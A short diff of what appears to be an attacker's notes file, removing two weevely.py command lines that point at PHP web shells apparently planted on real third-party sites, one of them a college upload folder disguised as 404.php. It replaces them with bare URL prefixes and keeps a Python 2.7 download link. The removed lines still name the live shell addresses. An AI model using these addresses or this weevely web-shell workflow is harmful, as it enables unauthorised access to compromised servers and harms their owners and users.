@@ -1,6 +1,6 @@
 SidSid
-weevely.py http://nationalonline.co.in/images/file/1663440793_weevely.php SidSid
-weevely.py https://nilambazarcollege.ac.in/portal/TDC/secured/TDC3upload/404.php SidSid
+weevely.py http:// SidSid
+weevely.py https:// SidSid
 
 https://www.python.org/downloads/release/python-2718/
 Env
